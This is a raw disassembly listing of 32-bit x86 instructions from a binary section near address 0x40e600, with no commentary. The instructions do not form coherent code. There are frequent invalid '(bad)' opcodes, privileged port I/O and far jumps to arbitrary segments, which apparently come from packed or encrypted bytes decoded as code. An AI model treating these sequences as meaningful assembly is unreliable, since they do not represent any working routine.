  40e5fd:	xchg   DWORD PTR [ebx-0x55],esi
  40e600:	jp     0x40e5c1
  40e602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e603:	add    al,0xb4
  40e605:	mov    eax,ds:0x57c5c5e5
  40e60a:	add    al,0x97
  40e60c:	shl    edi,1
  40e60e:	mov    al,0xee
  40e610:	lock scas eax,DWORD PTR es:[edi]
  40e612:	cwde   
  40e613:	cmc    
  40e614:	mov    dl,BYTE PTR [ecx-0x14472d2c]
  40e61a:	mov    dl,0x3c
  40e61c:	mov    esp,0xb218c3a1
  40e621:	push   eax
  40e622:	test   al,0xef
  40e624:	mov    dh,BYTE PTR [esi+0x4428186a]
  40e62a:	mov    ebp,0xa1fdd1c0
  40e62f:	out    dx,eax
  40e630:	jb     0x40e685
  40e632:	cmp    al,BYTE PTR [ebx+edi*8]
  40e635:	or     dh,BYTE PTR [esi+0x2b964bef]
  40e63b:	mov    ds:0x3d0be70d,eax
  40e640:	test   al,0xfa
  40e642:	mov    WORD PTR [ebx-0x22b472b2],gs
  40e648:	les    ecx,FWORD PTR [eax+ebp*4-0x4103e199]
  40e64f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e650:	lahf   
  40e651:	test   al,0xac
  40e653:	ds dec ebx
  40e655:	xchg   edi,eax
  40e656:	out    0x0,al
  40e658:	les    esi,FWORD PTR ds:0xffdf4433
  40e65e:	scas   al,BYTE PTR es:[edi]
  40e65f:	xchg   ebp,eax
  40e660:	jmp    0x27d0:0x89665cb2
  40e667:	popf   
  40e668:	pop    edi
  40e669:	sbb    ebp,DWORD PTR [esi+0xd2b17]
  40e66f:	xlat   BYTE PTR ds:[ebx]
  40e670:	lock dec ebx
  40e672:	adc    al,0xe5
  40e674:	jmp    0x577f:0xe7eb2c6d
  40e67b:	mov    cl,0x10
  40e67d:	xor    DWORD PTR [eax-0x24],edi
  40e680:	or     al,0x57
  40e682:	dec    esp
  40e683:	and    eax,edi
  40e685:	cmp    eax,0xe15c53a1
  40e68a:	stc    
  40e68b:	imul   ebp,DWORD PTR [ecx],0x10e44807
  40e691:	sub    ah,BYTE PTR [edi]
  40e693:	cmc    
  40e694:	jge    0x40e67a
  40e696:	iret   
  40e697:	es adc al,0x2b
  40e69a:	add    ecx,esp
  40e69c:	push   eax
  40e69d:	cmp    dl,BYTE PTR [eax]
  40e69f:	push   ebx
  40e6a0:	shr    BYTE PTR [esi-0x4d3b42ac],cl
  40e6a6:	mov    bh,dl
  40e6a8:	xchg   esp,eax
  40e6a9:	jg     0x40e6c9
  40e6ab:	push   ebx
  40e6ac:	sbb    dl,bl
  40e6ae:	sub    eax,0x3ab43519
  40e6b3:	loope  0x40e63d
  40e6b5:	or     al,BYTE PTR [eax-0x33]
  40e6b8:	xor    DWORD PTR [eax-0x3e],ebp
  40e6bb:	xchg   ecx,eax
  40e6bc:	les    ebp,FWORD PTR [eax-0x11]
  40e6bf:	xchg   BYTE PTR [ebx],ah
  40e6c1:	dec    ebx
  40e6c2:	ds xchg ecx,eax
  40e6c4:	adc    dh,BYTE PTR [edi]
  40e6c6:	(bad)  
  40e6c7:	pop    esi
  40e6c8:	push   0x2164e822
  40e6cd:	inc    ebx
  40e6ce:	cmp    ch,BYTE PTR [ebx-0x1add218f]
  40e6d4:	daa    
  40e6d5:	fidivr DWORD PTR [ebx+0x39ef081f]
  40e6db:	imul   ecx,DWORD PTR [edx],0xffffffa3
  40e6de:	data16 clc 
  40e6e0:	lock (bad) 
  40e6e2:	and    al,0x13
  40e6e4:	dec    edi
  40e6e5:	fcmovbe st,st(5)
  40e6e7:	imul   ecx,DWORD PTR [edx+0x663e23f7],0xffffffed
  40e6ee:	sbb    ch,BYTE PTR [ecx+0x28]
  40e6f1:	xchg   ebp,eax
  40e6f2:	pop    ss
  40e6f3:	push   es
  40e6f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6f5:	pop    es
  40e6f6:	in     al,dx
  40e6f7:	sub    BYTE PTR [ebp-0x3c],dh
  40e6fa:	inc    esi
  40e6fb:	mov    eax,ds:0xf28b41d9
  40e700:	lods   eax,DWORD PTR ds:[esi]
  40e701:	nop
  40e702:	dec    edi
  40e703:	mov    al,0x33
  40e705:	cdq    
  40e706:	jle    0x40e782
  40e708:	cdq    
  40e709:	dec    edi
  40e70a:	jbe    0x40e6db
  40e70c:	aad    0x78
  40e70e:	ret    0x1bfb
  40e711:	fdiv   QWORD PTR [ebx-0x1c846bc6]
  40e717:	cld    
  40e718:	xchg   ebp,eax
  40e719:	cmp    ebx,DWORD PTR [ecx-0x67]
  40e71c:	inc    esi
  40e71d:	ret    0x37d3
  40e720:	aaa    
  40e721:	push   eax
  40e722:	aam    0xf4
  40e724:	cdq    
  40e725:	sbb    edx,edi
  40e727:	sbb    bl,BYTE PTR [ebx]
  40e729:	jmp    0xa2decf69
  40e72e:	dec    ebp
  40e72f:	dec    ecx
  40e730:	cwde   
  40e731:	push   esi
  40e732:	sub    DWORD PTR [esi],edi
  40e734:	push   ebx
  40e735:	cwde   
  40e736:	add    al,0x54
  40e738:	jmp    0xdf0d:0x7de41c3e
  40e73f:	ficom  DWORD PTR [ebx+0x271213c2]
  40e745:	data16 aad 0x54
  40e748:	push   eax
  40e749:	push   ds
  40e74a:	sub    eax,0xf90de3d3
  40e74f:	retf   0xb54b
  40e752:	jle    0x40e7cc
  40e754:	(bad)  
  40e755:	mov    ebp,0x3fd98f8a
  40e75a:	xchg   DWORD PTR [ebx+0x7ea149e3],ecx
  40e760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e761:	mov    eax,DWORD PTR [ecx+0x52a9ed77]
  40e767:	xchg   edi,eax
  40e768:	nop
  40e769:	push   0x89564855
  40e76e:	repnz dec ecx
  40e770:	mov    al,ds:0x5e550594
  40e775:	mov    ah,0xe3
  40e777:	popa   
  40e778:	push   ecx
  40e779:	dec    ebp
  40e77a:	retf   0xf913
  40e77d:	mov    DWORD PTR ds:0xf9ffa99d,esp
  40e783:	lea    ebx,[eax+0x451d1406]
  40e789:	adc    DWORD PTR [edi+0x5d],0xffffffa0
  40e78d:	(bad)  
  40e78e:	inc    edi
  40e78f:	ins    DWORD PTR es:[edi],dx
  40e790:	rol    DWORD PTR [edi+0x1e7ed2a0],cl
  40e796:	jns    0x40e758
  40e798:	shl    BYTE PTR [ebx*1-0x7223b6b5],cl
  40e79f:	je     0x40e776
  40e7a1:	jecxz  0x40e816
  40e7a3:	mov    al,ds:0x79b11ad1
  40e7a8:	mov    ebx,0x4acc1d83
  40e7ad:	xor    ecx,DWORD PTR [edi+0x1efa1b97]
  40e7b3:	xchg   ecx,eax
  40e7b4:	dec    ebx
  40e7b5:	pop    edx
  40e7b6:	repz inc ebx
  40e7b8:	es stos DWORD PTR es:[edi],eax
  40e7ba:	cdq    
  40e7bb:	push   edi
  40e7bc:	sbb    eax,0x9c0199fe
  40e7c1:	out    0x7,eax
  40e7c3:	sbb    BYTE PTR [ebx],ch
  40e7c5:	test   BYTE PTR ds:0xdaa2e428,0xb3
  40e7cc:	adc    DWORD PTR [ebx+0x77],esp
  40e7cf:	sahf   
  40e7d0:	and    edi,esp
  40e7d2:	or     eax,DWORD PTR [eax-0x19]
  40e7d5:	fistp  QWORD PTR ds:0x8e4b31a9
  40e7db:	or     BYTE PTR [ebx],cl
  40e7dd:	jbe    0x40e80b
  40e7df:	cmc    
  40e7e0:	out    0xa,eax
  40e7e2:	pusha  
  40e7e3:	mov    ecx,0x95d6f5fd
  40e7e8:	cmp    BYTE PTR [eax],ah
  40e7ea:	adc    DWORD PTR [ecx],0x89a6b773
  40e7f0:	sub    BYTE PTR ds:0x2448594,ah
  40e7f6:	test   DWORD PTR [esi],0x26c82c9
  40e7fc:	sahf   
  40e7fd:	retf   
  40e7fe:	jns    0x40e879
  40e800:	or     al,0xc1
  40e802:	mov    BYTE PTR gs:0x3472a741,0x51
  40e80a:	sbb    edx,DWORD PTR [ebx+esi*4]
  40e80d:	es call FWORD PTR es:[ebx-0x55086cd0]
  40e815:	push   es
  40e816:	jnp    0x40e84f
  40e818:	mov    DWORD PTR [esi-0x1f],ebx
  40e81b:	or     al,0xd8
  40e81d:	or     BYTE PTR [eax-0x6c9fe54d],ch
  40e823:	inc    esi
  40e824:	pop    eax
  40e825:	mov    bl,0x2a
  40e827:	xchg   esp,eax
  40e828:	adc    dh,BYTE PTR [edi+0x67feb013]
  40e82e:	mov    esi,0x7a653578
  40e833:	push   edx
  40e834:	retf   0xb6ae
  40e837:	lods   eax,DWORD PTR ds:[esi]
  40e838:	push   cs
  40e839:	jne    0x40e7e7
  40e83b:	add    cl,BYTE PTR [esi]
  40e83d:	jecxz  0x40e8b2
  40e83f:	and    al,BYTE PTR [edx+0x58]
  40e842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e843:	mov    dl,bh
  40e845:	adc    BYTE PTR [edi+0x553857ec],al
  40e84b:	sbb    ebx,DWORD PTR [eax+0x6f]
  40e84e:	push   ebx
  40e84f:	push   esp
  40e850:	retf   0xaf8
  40e853:	jmp    0x4e41:0x7b4ead06
  40e85a:	std    
  40e85b:	push   cs
  40e85c:	jle    0x40e899
  40e85e:	(bad)
  40e862:	scas   al,BYTE PTR es:[edi]
  40e863:	(bad)  
  40e864:	daa    
  40e865:	jbe    0x40e8c5
  40e867:	lea    ecx,[ebx]
  40e869:	jae    0x40e86f
  40e86b:	das    
  40e86c:	nop
  40e86d:	in     al,0x59
  40e86f:	out    dx,eax
  40e870:	inc    esp
  40e871:	sbb    cl,BYTE PTR [edi+0x2d0b3ff3]
  40e877:	push   DWORD PTR [eax-0x32204dee]
  40e87d:	sub    ah,al
  40e87f:	pop    ebp
  40e880:	push   esp
  40e881:	or     DWORD PTR [eax+0x13],edi
  40e884:	pop    ebp
  40e885:	add    eax,0xc4f2c24
  40e88a:	cs mov ebp,0x2491f64e
  40e890:	adc    cl,BYTE PTR [eax-0x5d83af89]
  40e896:	inc    ebp
  40e897:	bound  ebp,QWORD PTR cs:[edi-0x3bd89aee]
  40e89e:	and    eax,0x6d82ad29
  40e8a3:	cwde   
  40e8a4:	and    DWORD PTR gs:[eax-0x14],esp
  40e8a8:	xor    DWORD PTR [ebp-0x4],ebx
  40e8ab:	push   es
  40e8ac:	push   ecx
  40e8ad:	dec    edi
  40e8ae:	cmp    esp,DWORD PTR [edx]
  40e8b0:	dec    edi
  40e8b1:	stos   DWORD PTR es:[edi],eax
  40e8b2:	fs push edi
  40e8b4:	and    ecx,eax
  40e8b6:	jnp    0x40e83b
  40e8b8:	rol    al,cl
  40e8ba:	adc    BYTE PTR [esi],bh
  40e8bc:	mov    ds:0x83cd894a,eax
  40e8c1:	dec    esp
  40e8c2:	data16 add dl,ch
  40e8c5:	clc    
  40e8c6:	sar    BYTE PTR [edx-0x2da52f25],cl
  40e8cc:	pop    eax
  40e8cd:	js     0x40e86f
  40e8cf:	ficomp DWORD PTR [esi]
  40e8d1:	std    
  40e8d2:	dec    esp
  40e8d3:	retf   
  40e8d4:	sbb    ebp,DWORD PTR [edi+0x57ee40fe]
  40e8da:	pop    ebx
  40e8db:	lods   al,BYTE PTR ds:[esi]
  40e8dc:	cdq    
  40e8dd:	mov    bl,0x4d
  40e8df:	fstp   st(3)
  40e8e1:	call   0xf69:0x61a658e0
  40e8e8:	inc    ebp
  40e8e9:	les    esi,FWORD PTR [edi+0x9870903]
  40e8ef:	iret   
  40e8f0:	and    DWORD PTR [edi+0x1b],ecx
  40e8f3:	inc    ebx
  40e8f4:	xor    al,0x91
  40e8f6:	mov    eax,0xedb796c0
  40e8fb:	pop    ecx
  40e8fc:	and    DWORD PTR [ebx+ebx*4-0x53],eax
  40e900:	sbb    eax,0xf1869c3d
  40e905:	ffreep st(4)
  40e907:	cmp    DWORD PTR [edi+0x5d],esp
  40e90a:	pop    ebp
  40e90b:	int3   
  40e90c:	dec    ecx
  40e90d:	dec    esi
  40e90e:	aam    0x63
  40e910:	add    dh,dh
  40e912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e913:	jnp    0x40e8b3
  40e915:	ret    
  40e916:	ss cmp al,0x31
  40e919:	jg     0x40e8da
  40e91b:	popf   
  40e91c:	xchg   edx,eax
  40e91d:	dec    esp
  40e91e:	repnz dec ecx
  40e920:	stos   BYTE PTR es:[edi],al
  40e921:	repnz repz fld st(6)
  40e925:	fnclex 
  40e927:	push   0xf9428423
  40e92c:	push   edx
  40e92d:	mov    WORD PTR [esi-0x50b91c5c],?
  40e933:	xchg   DWORD PTR [ecx-0x3d],esi
  40e936:	retf   0xf97
  40e939:	in     al,0x87
  40e93b:	inc    ebp
  40e93c:	add    ebx,ecx
  40e93e:	add    BYTE PTR [ebp-0x6c37e7b8],ch
  40e944:	xor    BYTE PTR [edx+0x418004ba],0x18
  40e94b:	jge    0x40e910
  40e94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e94e:	mov    dl,cl
  40e950:	mov    ebx,0x1b10bff9
  40e955:	push   es
  40e956:	repnz in eax,dx
  40e958:	mov    ecx,0x6a08b7b
  40e95d:	ins    BYTE PTR es:[edi],dx
  40e95e:	xor    dl,BYTE PTR [eax+0x26]
  40e961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e962:	sub    BYTE PTR [ebx],bl
  40e964:	cmp    ebx,esp
  40e966:	mov    dh,0xfb
  40e968:	push   edi
  40e969:	mov    ebx,0x45240b65
  40e96e:	sbb    BYTE PTR [ebp+0x655a2344],al
  40e974:	(bad)  
  40e976:	pushf  
  40e977:	cli    
  40e978:	repz xchg ebp,eax
  40e97a:	mov    eax,ds:0x4c9ef954
  40e97f:	pusha  
  40e980:	adc    esp,DWORD PTR [eax+0x47]
  40e983:	xchg   esp,eax
  40e984:	icebp  
  40e985:	xchg   esi,eax
  40e986:	scas   eax,DWORD PTR es:[edi]
  40e987:	(bad)  
  40e988:	jl     0x40e9a5
  40e98a:	fadd   st(1),st
  40e98c:	mov    dh,0x1c
  40e98e:	icebp  
  40e98f:	retf   
  40e990:	inc    ebp
  40e991:	adc    dh,BYTE PTR [ebp+esi*1+0x4bbb0074]
  40e998:	test   ebp,eax
  40e99a:	inc    ecx
  40e99b:	sar    BYTE PTR [esi],1
  40e99d:	sbb    ebx,DWORD PTR [eax-0x5b]
  40e9a0:	jne    0x40e98e
  40e9a2:	repz jmp 0x40e944
  40e9a5:	inc    ecx
  40e9a6:	icebp  
  40e9a7:	jne    0x40e962
  40e9a9:	jge    0x40ea0c
  40e9ab:	jne    0x40ea2c
  40e9ad:	loopne 0x40e9b3
  40e9af:	add    DWORD PTR [edx+0x4355bf3b],ebx
  40e9b5:	in     al,0x5a
  40e9b7:	leave  
  40e9b8:	mov    eax,ds:0xe1483583
  40e9bd:	jg     0x40e9a4
  40e9bf:	or     esp,DWORD PTR [eax-0x36]
  40e9c2:	(bad)  
  40e9c3:	in     al,dx
  40e9c4:	inc    ebp
  40e9c5:	pop    eax
  40e9c6:	dec    esi
  40e9c7:	pop    esp
  40e9c8:	shl    BYTE PTR [edx+esi*4-0x684655f4],0x98
  40e9d0:	outs   dx,BYTE PTR ds:[esi]
  40e9d1:	push   eax
  40e9d2:	rep ins BYTE PTR es:[edi],dx
  40e9d4:	neg    BYTE PTR [edx]
  40e9d6:	xchg   esi,eax
  40e9d7:	or     cl,al
  40e9d9:	cli    
  40e9da:	adc    eax,0x68e0e962
  40e9df:	sbb    esp,ebx
  40e9e1:	push   eax
  40e9e2:	sub    DWORD PTR [ebp+0x113b9b9c],0xffffffbc
  40e9e9:	bound  ebx,QWORD PTR ss:[edi]
  40e9ec:	pop    esi
  40e9ed:	data16 mov al,0x15
  40e9f0:	in     al,0xe5
  40e9f2:	pop    ss
  40e9f3:	push   ecx
  40e9f4:	sub    al,0xd1
  40e9f6:	jl     0x40ea08
  40e9f8:	mov    dh,0x9d
  40e9fa:	outs   dx,DWORD PTR ds:[esi]
  40e9fb:	inc    eax
  40e9fc:	sub    DWORD PTR [edx+0x32],esp
  40e9ff:	test   eax,0xae78034d
  40ea04:	cmp    ebp,DWORD PTR [ebx+0x13088e3c]
  40ea0a:	sub    al,0x49
  40ea0c:	cmp    dh,al
  40ea0e:	pop    ebp
  40ea0f:	xchg   esp,eax
  40ea10:	call   0x1f12ee4a
  40ea15:	xchg   edx,eax
  40ea16:	ror    BYTE PTR [esi+0x75],cl
  40ea19:	jo     0x40ea68
  40ea1b:	ret    0x4ea2
  40ea1e:	in     eax,dx
  40ea1f:	jecxz  0x40ea43
  40ea21:	xchg   eax,edx
  40ea23:	popf   
  40ea24:	(bad)  
  40ea26:	popa   
  40ea27:	les    edx,FWORD PTR [esi+0x74157b80]
  40ea2d:	mov    esp,0x9fdbb456
  40ea32:	pop    ebx
  40ea33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea34:	dec    DWORD PTR [ecx+esi*1-0x10]
  40ea38:	jg     0x40ea60
  40ea3a:	or     eax,DWORD PTR [ecx+0xad8acb0]
  40ea40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea41:	xchg   edx,eax
  40ea42:	sub    BYTE PTR [esi],ch
  40ea44:	stos   DWORD PTR es:[edi],eax
  40ea45:	dec    ebx
  40ea46:	xor    BYTE PTR [ebp-0x4cb6e6d6],dl
  40ea4c:	ins    DWORD PTR es:[edi],dx
  40ea4d:	xchg   ebx,eax
  40ea4e:	jmp    DWORD PTR [ebp+esi*2-0x43]
  40ea52:	sbb    DWORD PTR [eax+0x8],eax
  40ea55:	je     0x40ea7f
  40ea57:	cwde   
  40ea58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea59:	(bad)
  40ea5d:	cmp    DWORD PTR [edi],edx
  40ea5f:	mov    dl,0xc8
  40ea61:	aaa    
  40ea62:	fs mov esp,0x7627a190
  40ea68:	in     al,dx
  40ea69:	mov    ebp,0xe3ffbb93
  40ea6e:	mov    eax,0xf1c6204f
  40ea73:	and    BYTE PTR cs:[ebx-0x5c],0x37
  40ea78:	mov    ds:0xacf70cbb,al
  40ea7d:	lea    edx,[edx-0x24135937]
  40ea83:	sbb    ah,0xe2
  40ea86:	mov    esi,DWORD PTR [ebp+0x22]
  40ea89:	add    al,ah
  40ea8b:	xchg   DWORD PTR [edi+0x54],edi
  40ea8e:	cwde   
  40ea8f:	(bad)  
  40ea90:	ja     0x40eaeb
  40ea92:	cmp    esp,ecx
  40ea94:	loopne 0x40ead4
  40ea96:	push   0xffffffa8
  40ea98:	xor    ecx,DWORD PTR [edx-0x6b]
  40ea9b:	add    BYTE PTR es:[esi],bl
  40ea9e:	unpcklps xmm6,xmm2
  40eaa1:	fwait
  40eaa2:	pop    ebp
  40eaa3:	cmp    DWORD PTR [eax+0x6e],ebp
  40eaa6:	sbb    edx,DWORD PTR [ebp+0x6aeb517d]
  40eaac:	sbb    BYTE PTR [edx],0x8c
  40eaaf:	ja     0x40eac5
  40eab1:	add    ebx,ebp
  40eab3:	and    BYTE PTR [edx+0x1ba1ba59],ch
  40eab9:	dec    ebp
  40eaba:	sbb    BYTE PTR [ebx+eax*2+0x3d41cbd5],0xf8
  40eac2:	repz mov ds:0x5101ffe,eax
  40eac8:	inc    ebx
  40eac9:	push   edi
  40eaca:	sbb    eax,0x7c221b15
  40ead0:	xor    DWORD PTR [ebp+0x3f],ebp
  40ead3:	repnz cmp ebp,esi
  40ead6:	mov    eax,ds:0x6735009c
  40eadb:	inc    edi
  40eadc:	iret   
  40eadd:	pop    ss
  40eade:	(bad)  
  40eadf:	dec    esi
  40eae0:	push   ebp
  40eae1:	lds    esp,FWORD PTR [ecx+0x3e]
  40eae4:	scas   al,BYTE PTR es:[edi]
  40eae5:	ja     0x40eb0e
  40eae7:	repnz retf 0x3a44
  40eaeb:	jmp    0x40ea6e
  40eaed:	ins    DWORD PTR es:[edi],dx
  40eaee:	jmp    0x40ea82
  40eaf0:	mov    ds:0x9f0c92a6,eax
  40eaf5:	jge    0x40eb6a
  40eaf7:	in     al,0x71
  40eaf9:	bound  esi,QWORD PTR [eax]
  40eafb:	dec    ebp
  40eafc:	das    
  40eafd:	jecxz  0x40eb1e
  40eaff:	stos   DWORD PTR es:[edi],eax
  40eb00:	add    BYTE PTR [eax+eiz*1+0x7],al
  40eb04:	aam    0xaa
  40eb06:	mov    eax,ds:0x1aa1d598
  40eb0b:	lahf   
  40eb0c:	fadd   QWORD PTR [esi+0x6]
  40eb0f:	sbb    DWORD PTR [ebx],esi
  40eb11:	lds    edx,FWORD PTR [edi+0x2495a577]
  40eb17:	pop    ss
  40eb18:	call   0xc620d202
  40eb1d:	sbb    esp,edi
  40eb1f:	in     eax,dx
  40eb20:	jmp    0x40eb3d
  40eb22:	jl     0x40eb39
  40eb24:	mov    dl,0xb7
  40eb26:	inc    ebp
  40eb27:	ins    DWORD PTR es:[edi],dx
  40eb28:	jge    0x40eac5
  40eb2a:	jae    0x40eac7
  40eb2c:	sbb    edx,DWORD PTR [ebx+0x38c34ecd]
  40eb32:	and    DWORD PTR [edi-0x25],edx
  40eb35:	add    al,BYTE PTR [esi+ecx*1]
  40eb38:	fcmovu st,st(7)
  40eb3a:	jae    0x40eb67
  40eb3c:	pop    eax
  40eb3d:	sub    esp,DWORD PTR [edi+ecx*2]
  40eb40:	test   DWORD PTR [esi+0x65],0xceb8f9d4
  40eb47:	jb     0x40eba3
  40eb49:	cmp    BYTE PTR ds:0xba95d11b,cl
  40eb4f:	pusha  
  40eb50:	xor    BYTE PTR [esi+0x7dd5ceb3],cl
  40eb56:	push   ecx
  40eb57:	mov    edi,DWORD PTR [edx+0x5bfc00e1]
  40eb5d:	enter  0x7b47,0x5f
  40eb61:	push   ecx
  40eb62:	inc    ebx
  40eb63:	fldenv [ebx]
  40eb65:	push   eax
  40eb66:	mov    eax,0xcd7d7191
  40eb6b:	ins    DWORD PTR es:[edi],dx
  40eb6c:	stos   DWORD PTR es:[edi],eax
  40eb6d:	js     0x40eb03
  40eb6f:	dec    ebp
  40eb70:	mov    esp,esp
  40eb72:	add    DWORD PTR [ebx],edx
  40eb74:	into   
  40eb75:	push   ss
  40eb76:	or     cl,BYTE PTR [edi+0x48]
  40eb79:	jns    0x40eb64
  40eb7b:	fstp   QWORD PTR [esp+eiz*2+0x3]
  40eb7f:	call   0x4b1b:0x4629adc1
  40eb86:	xchg   DWORD PTR [edi-0x78],ebp
  40eb89:	pop    ecx
  40eb8a:	shl    DWORD PTR [eax-0x5b],0x63
  40eb8e:	push   ds
  40eb8f:	xor    BYTE PTR [edx-0x5f9a3152],cl
  40eb95:	shr    BYTE PTR [edi-0x4f],0x41
  40eb99:	ins    DWORD PTR es:[edi],dx
  40eb9a:	mov    edx,0x8849f53f
  40eb9f:	loopne 0x40ebe9
  40eba1:	aas    
  40eba2:	cwde   
  40eba3:	stos   BYTE PTR es:[edi],al
  40eba4:	inc    esp
  40eba5:	in     eax,0x8a
  40eba7:	mov    ebx,0xb0d1233
  40ebac:	out    dx,eax
  40ebad:	dec    eax
  40ebae:	addr16 xchg ebx,eax
  40ebb0:	mov    bl,0x3a
  40ebb2:	mov    BYTE PTR [edx-0x53],ch
  40ebb5:	xor    al,0xc6
  40ebb7:	or     eax,0x24e20dab
  40ebbc:	scas   eax,DWORD PTR es:[edi]
  40ebbd:	push   0x65
  40ebbf:	xchg   ecx,eax
  40ebc0:	dec    esi
  40ebc1:	pop    esp
  40ebc2:	addr16 jae 0x40eba3
  40ebc5:	jmp    0x3cec4b9e
  40ebca:	jno    0x40ec30
  40ebcc:	aad    0x94
  40ebce:	and    ebp,DWORD PTR [ecx+0x40]
  40ebd1:	(bad)  
  40ebd2:	pop    edx
  40ebd3:	inc    esp
  40ebd4:	ins    DWORD PTR es:[edi],dx
  40ebd5:	outs   dx,BYTE PTR ds:[esi]
  40ebd6:	inc    edi
  40ebd7:	adc    dh,dl
  40ebd9:	out    0x79,al
  40ebdb:	repz sub eax,0xdfef99af
  40ebe1:	jae    0x40ebfc
  40ebe3:	dec    ecx
  40ebe4:	xor    eax,0x848dbc16
  40ebe9:	add    al,al
  40ebeb:	pop    ecx
  40ebec:	repz pushw es
  40ebef:	mov    ebx,0xdc5b977a
  40ebf4:	push   ds
  40ebf5:	icebp  
  40ebf6:	push   eax
  40ebf7:	mov    ebp,0xd3dae3e2
  40ebfc:	outs   dx,DWORD PTR ds:[esi]
  40ebfd:	loope  0x40ec1c
  40ebff:	pop    ss
  40ec00:	pop    esi
  40ec01:	pop    ebx
  40ec02:	pop    ds
  40ec03:	xor    eax,DWORD PTR [ecx-0x27]
  40ec06:	(bad)  
  40ec08:	stos   BYTE PTR es:[edi],al
  40ec09:	into   
  40ec0a:	and    ecx,ebx
  40ec0c:	jge    0x40ec1e
  40ec0e:	push   edx
  40ec0f:	fxch   st(6)
  40ec11:	jg     0x40ec21
  40ec13:	(bad)  
  40ec14:	out    dx,eax
  40ec15:	lds    esi,FWORD PTR [edi]
  40ec17:	out    dx,eax
  40ec18:	stos   BYTE PTR es:[edi],al
  40ec19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec1a:	mov    ecx,0x303fbde5
  40ec1f:	xor    eax,0x2cb5b050
  40ec24:	sbb    al,0x47
  40ec26:	cmc    
  40ec27:	xchg   edi,eax
  40ec28:	ds pop esp
  40ec2a:	(bad)  
  40ec2b:	xchg   ecx,eax
  40ec2c:	stc    
  40ec2d:	pop    ecx
  40ec2e:	jp     0x40ec24
  40ec30:	add    cl,0xb0
  40ec33:	ret    0x26e0
  40ec36:	(bad)  
  40ec37:	jmp    0x40ebdb
  40ec39:	rcr    DWORD PTR [eax-0x32cbe36],0x59
  40ec40:	xor    edi,esi
  40ec42:	fisttp WORD PTR [edi+0x43b9ec36]
  40ec48:	cmp    bh,ah
  40ec4a:	cs mov ch,0xc6
  40ec4d:	fisubr DWORD PTR [ebx+0x8f8caa2]
  40ec53:	jp     0x40ec53
  40ec55:	ds inc ebx
  40ec57:	xor    BYTE PTR [ebp+0x61],al
  40ec5a:	rcr    BYTE PTR [edx+edi*8+0x1e],cl
  40ec5e:	jbe    0x40ecc7
  40ec60:	das    
  40ec61:	scas   al,BYTE PTR es:[edi]
  40ec62:	enter  0xa3a8,0x6
  40ec66:	adc    DWORD PTR [edx+0x59],eax
  40ec69:	in     al,dx
  40ec6a:	and    al,0x89
  40ec6c:	sbb    ecx,DWORD PTR [esi-0x676c83b9]
  40ec72:	je     0x40ec0c
  40ec74:	add    dh,BYTE PTR [edx+esi*1+0x43]
  40ec78:	lock add eax,esi
  40ec7b:	add    ah,dl
  40ec7d:	xchg   esp,eax
  40ec7e:	call   0x17f5:0xd0fe67de
  40ec85:	int    0xea
  40ec87:	sub    eax,0xc9f528ab
  40ec8c:	arpl   WORD PTR [edi+0x33],cx
  40ec8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec90:	aaa    
  40ec91:	clc    
  40ec92:	mov    ecx,0x6e54bb44
  40ec97:	rcr    DWORD PTR [edi+0x723f58e5],1
  40ec9d:	fs jmp 0xf42728d0
  40eca3:	pop    esp
  40eca4:	jb     0x40eccd
  40eca6:	inc    eax
  40eca7:	outs   dx,DWORD PTR ds:[esi]
  40eca8:	dec    edi
  40eca9:	xchg   esi,eax
  40ecaa:	sub    al,0x85
  40ecac:	add    al,0xb1
  40ecae:	xchg   edi,eax
  40ecaf:	stc    
  40ecb0:	clc    
  40ecb1:	push   ss
  40ecb2:	xor    al,0x4
  40ecb4:	adc    ch,ch
  40ecb6:	cmp    eax,0x6398b501
  40ecbb:	or     eax,0x449d2ca0
  40ecc0:	addr16 pop ecx
  40ecc2:	into   
  40ecc3:	cmp    al,0xeb
  40ecc5:	inc    ebp
  40ecc6:	add    esi,eax
  40ecc8:	dec    edi
  40ecc9:	inc    esi
  40ecca:	inc    ebx
  40eccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eccc:	xor    DWORD PTR [ebx+0x56],ecx
  40eccf:	sbb    DWORD PTR [esp+eax*1-0x26a74688],esi
  40ecd6:	in     al,dx
  40ecd7:	adc    ebp,DWORD PTR [esi+0x1dbff72a]
  40ecdd:	std    
  40ecde:	mov    cl,0x35
  40ece0:	ss sub ecx,ebp
  40ece3:	psubsb mm3,mm7
  40ece6:	sbb    edi,ecx
  40ece8:	in     al,dx
  40ece9:	std    
  40ecea:	jbe    0x40eca6
  40ecec:	mov    ds:0xe807cced,eax
  40ecf1:	pop    esi
  40ecf2:	je     0x40ed41
  40ecf4:	inc    edi
  40ecf5:	popa   
  40ecf6:	xor    al,0xbd
  40ecf8:	jle    0x40ec98
  40ecfa:	scas   eax,DWORD PTR es:[edi]
  40ecfb:	aam    0xb0
  40ecfd:	scas   al,BYTE PTR es:[edi]
  40ecfe:	pop    ecx
  40ecff:	scas   eax,DWORD PTR es:[edi]
  40ed00:	adc    DWORD PTR [edx],esi
  40ed02:	sub    ebx,DWORD PTR [edi-0x6b]
  40ed05:	pop    ss
  40ed06:	mov    al,0x97
  40ed08:	loop   0x40ed0d
  40ed0a:	lds    ecx,FWORD PTR ds:0x446f4fd9
  40ed10:	and    eax,0xc07ae4b
  40ed15:	xor    eax,0x2fb8a6e5
  40ed1a:	mov    al,ds:0xdebfa498
  40ed1f:	xchg   ebp,edi
  40ed21:	xchg   BYTE PTR [ebx],bh
  40ed23:	ins    DWORD PTR es:[edi],dx
  40ed24:	dec    esp
  40ed25:	mov    bl,0xf9
  40ed27:	mov    WORD PTR [edi+ecx*4+0x10],ss
  40ed2b:	jbe    0x40ed64
  40ed2d:	push   es
